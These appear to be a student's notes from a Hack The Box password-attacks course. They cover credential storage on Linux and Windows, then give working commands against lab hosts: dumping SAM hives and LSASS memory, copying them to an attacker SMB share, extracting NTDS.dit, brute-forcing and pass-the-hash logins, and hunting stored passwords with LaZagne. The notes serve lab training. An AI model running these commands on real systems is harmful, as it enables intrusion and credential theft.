# **Password Attacks**
**Theory of Protection**

- CIA - Confidentiality, Integrity, and Availability
- This module focuses on Authentication
  - Validation of combination of at least 2 of 3 things
    - Something you know
      - Password, passcode, pin, etc
    - Something you have
      - ID card, security key, other MFA tools
    - Something you are
      - Your physical self, username, email address, etc
  - Passwords are an extremely common means of authentication
  - A password or passphrase can be generally defined as a combination of letters, numbers, and symbols in a string for identity validation.
  - A good password is a combination between complexity and simplicity
    - Ex. TreeDogEvilElephant
  - Interesting password stats can be found here: [OF_Google_HarrisPoll_National_03 (storage.googleapis.com)](https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf)
  - [HaveIBeenPwned](https://haveibeenpwned.com/) allows you to see if your email was included in any large databreaches

**Credential Storage**

- Credentials may either be stored locally or remotely
  - SQL-injections may lead to worst-case scenarios when it comes to local credentials
  - rockyou.txt contains around 14 million unique passwords
    - Created after the company RockYou had 32 million user passwords breached
    - Result of successful SQL injection
- **Linux Authentication**
  - Local passwords stored in /etc/shadow
    - Commonly hashed
    - <username>: <encrypted password>: <day of last change>: <min age>: <max age>: <warning period>: <inactivity period>: <expiration date>: <reserved field>
      - Encryption formatting: $id$salt$hashed\_password
    - The ID is the cryptographic hash
    - /etc/passwd and /etc/shadow also contain user data
      - At one point in time, /etc/shadow contained the hashed passwords

|**ID**|**Cryptographic Hash Algorithm**|
| :-: | :-: |
|$1$|[MD5](https://en.wikipedia.org/wiki/MD5)|
|$2a$|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))|
|$5$|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|$6$|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|$sha1$|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|$y$|[Yescrypt](https://github.com/openwall/yescrypt)|
|$gy$|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|$7$|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

- **Windows Authentication (Booo)**
  - Windows Authentication is often more complex than Linux
    - Consists of
      - Logon
      - Retrieval
      - Verification
      - Other complex Windows procedures, such as Kerberos
    - Local Security Authority (LSA)
      - Protected subsystem that authenticates users, and logs them on the local computer
      - Maintains info on all security aspects of the computer
      - Provides various translation services between names and SIDs (security IDs)
    - Windows Authentication Process
      - ![Auth_process1.webp](Aspose.Words.2046f680-6903-4adc-86e6-a585e95a060e.001.jpeg) 
    - Local interactive logon is an interaction between
      - WinLogon
        - Trusted process (haha) responsible for managing security-related user interactions
          - Launching LogonUI
          - Changing passwords
          - Locking and unlocking the workstation
        - Immediately launches LogonUI, and upon receival of creds, calls LSASS to authenticate user
      - LogonUI
        - logon user interface process
      - Credential Providers
      - LSASS (Local Security Authority Subsystem Service) = Vault for Windows-based authentication systems
        - Responsible for
          - Local system security policy
          - User authentication
          - Sending security audit logs to the Event Log
          - **Interesting in learning more abut LSASS AND reading Windows documentation? Check it out [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\)?redirectedfrom=MSDN)!!!!!!!!!!!!**
      - One or more authentication packages
        - Such as Dynamic-Link Libraries (DLL), that perform auth checks
        - Msv1\_0.dll used for non-domain joined and interactive logins
      - SAM or Active Directory


## Windows Local Password Attack
### SAM
- It is beneficial to download hashes locally, then crack them (instead of cracking them on the target). We can do this by copying the SAM registry hives
- Registry Hives:
  - `hklm\sam`: Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
  - `hklm\system`: Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
  - `hklm\security`: Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
    - \security is not needed, but can be helpful
- **Using reg.exe save to copy registry hives**
  - `reg.exe save <registry_hive> C:\<registry_hive>`
- Create a share:
  - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/`
  - `move sam.save \\<ip>\CompData`
  - `move security.save \\<ip>\CompData`
  - `move system.save \\<ip>\CompData`
  - `ls`
  - Dump hashes offline: `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
  - `sudo nano hashestocrack.txt`
    - Crack the hashes
- We can also dump LSA secrets remotely (if we have local admin privileges): `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
- We can ALSO dump hashes from the SAM database remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

### LSASS
- LSASS plays a central role in credential managemetn and authentication
  - Caches creds in local mem
  - Creates access tokens
  - Enforces security policies
  - Writes to Windows security log
- **Dump LSASS**
  - GUI Version
    - Task Manager > Processes tab > Local Security Authority Process > *Right Click* > Create dump file
    - This creates a file at: `C:\Users\<usr>\AppData\Local\Temp`
  - cmd Version: `tasklist /svc`
  - PowerShell Version: `Get-Process lsass`
  - Create the lsass dumb in PowerShell:
    - rundll32 version: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`
    - Pypykatz version: `pypykatz lsa minidump /home/<user>/Documents/lsass.dmp`

### Attacking Active Directory & NTDS.dit
- AD is highly common. There are two main types of attacks when attacking credentials
- Dictionary Attacks
  - There are common formats of usernames, which many usernames in a company are likely to follow (eg. firstinitiallastname, firstname.lastname, etc)
  - We can find these *often* by searching for `@<fqdn>` (eg. @inlanefreight.com), or dorking `<fqdn> filetype:pdf`
  - Once we have a list of names, we can use username-anarchy to generate the list of names: `./username-anarchy -i /home/<user>/names.txt`
  - Then, we can launch the attack with CrackMapExec: `crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`
  - We can view logs in the Event Viewer
- Dumping Hashes from NTDS.dit
  - NTDS.dit is the primary database file associated with AD
  - Connect to the target via evil-winrm (with the creds we captured previously): `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`
  - Once in, see what privs we have: `net localgroup`
    - Also: `net user <ouruser>`
  - Make a volume shadow copy of the C: drive (or whatever drive AD is on): `vssadmin CREATE SHADOW /For=C:`
  - Copy NTDS.dit from volume shadow copy of C: to another location, to prepare to move NTDS.dit to our attack host: `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
  - Move it on over (maybe create a share first)
  - **Faster Alternative**
    - `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`
    - Crack the hashes!
  - **What if we can't crack the hash?**
    - We can use a type of attack called Pass-the-Hash (PtH)
      - This takes advantage of the NTLM authentication protocol
    - `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`

### Credential Hunting in Windows
- Creds are often saved on a local system. How can we find these?
- **GUI**
  - Use the Windows Search feature
  - Search for one of these keywords: `Passwords, Passphrases, Keys, Username, User account, Creds, Users,	Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials`
- **cmd or Powershell**
  - Using lazagne:
    - Install lazagne: https://github.com/AlessandroZ/LaZagne/releases/
    - `start lazagne.exe all`
  - Using findstr
    - `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

# Linux Local Password Attacks

## Credential Hunting in Linux

